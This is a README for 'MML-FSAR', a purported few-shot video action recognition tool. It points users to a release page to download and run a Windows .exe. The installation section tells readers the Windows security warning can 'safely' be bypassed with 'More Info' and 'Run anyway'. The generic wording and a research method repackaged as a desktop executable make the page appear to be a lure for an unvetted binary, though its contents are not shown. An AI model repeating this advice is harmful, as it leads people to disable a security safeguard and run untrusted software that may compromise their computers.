# 🤖 MML-FSAR - Identify actions in short videos quickly

[![Download MML-FSAR](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dedralingual814/MML-FSAR/releases)

MML-FSAR helps you recognize human actions in video files. This software uses artificial intelligence to look at video footage and identify what a person does. It focuses on few-shot recognition. This means the system learns to detect specific activities even when it has seen only one or two examples. 

The software uses a combination of two methods. First, it uses metric learning. This process groups similar videos together in a digital space. Second, it uses CLIP-based adaptation. This connects visual video data with plain text descriptions. These two parts work together so the computer understands movement patterns without months of training.

## 📥 Getting Started

You need a Windows computer to use this software. This guide covers how to set up your device and start the application.

Follow these steps to find the file:

1. Go to the [official release page](https://github.com/dedralingual814/MML-FSAR/releases).
2. Look for the most recent version at the top of the list.
3. Click the link that ends in .zip or .exe to save it to your computer.
4. Extract the contents if you downloaded a compressed folder.

## 🖥️ System Requirements

Your computer needs specific hardware to run the software at a good speed. While the program runs on standard hardware, you get better results with modern components.

- Operating System: Windows 10 or Windows 11.
- Memory: At least 16 Gigabytes of RAM.
- Processor: A multi-core processor from the last five years.
- Storage: 5 Gigabytes of free space to hold model weights and system files.
- Graphics: A dedicated graphics card with at least 8 Gigabytes of video memory. NVIDIA cards work best because this software uses PyTorch.

## 🛠️ Installation Steps

Windows might show a security warning because this is a custom application. You can safely bypass this screen.

1. Open the folder where you saved the download.
2. Double-click the file named MML-FSAR.exe.
3. If a blue box appears, click More Info and then select Run anyway.
4. A small window appears on your desktop. This shows the status of the background systems as they initialize.
5. Wait for the green text to confirm that all systems are ready.

## 🎥 Using the Application

The main interface shows a simple box where you drag and drop video files.

1. Locate a video file on your computer.
2. Click and hold the file. Drag it into the open window.
3. The software analyzes the video. A progress bar shows you how much time remains.
4. Once finished, a text box appears below the video. The program displays the name of the action it identified.
5. You can save these results as a text file for your records.

## ⚙️ Configuration Settings

You can adjust how the software identifies actions. Click the gear icon in the top corner to see the menu.

- Confidence Threshold: This setting controls how sure the program must be before it gives you an answer. Set this closer to 1.0 if you want fewer, more accurate results.
- Frame Skip: This changes how many frames the software checks. High numbers make the process faster but might miss brief actions.
- Output Path: Choose where the software saves the result files on your drive.

## 🧠 Troubleshooting Common Issues

If the software does not work, check these common points.

- The application closes immediately: This usually means your graphics card driver needs an update. Visit the website of your hardware manufacturer to download the latest software.
- The software says "Model missing": Ensure you kept the data folder in the same location as the executable file. Do not move folders after you extract them.
- Processing takes too long: Reduce the resolution of your input video. Large files require significant processing power. Converting your video to 720p often fixes performance delays.

## 🔄 Updating the Software

Check the release page once a month for updates. When a new version arrives, download the new file. You can replace the old folder with the new one. Settings usually transfer automatically, but make a backup of your output files first.

## 💻 Technical Background

This implementation uses PyTorch. PyTorch acts as the engine that powers the neural network. The system compares features from your video to a predefined set of learned action characteristics. Because the system uses metric learning, it calculates the distance between the visual features in your video and known action sets. If the distance is small, the system labels the video with the name of that action. The adaptation layer ensures the system understands the motion even if the specific camera angle is different from the training data. This approach makes MML-FSAR useful for diverse video collections.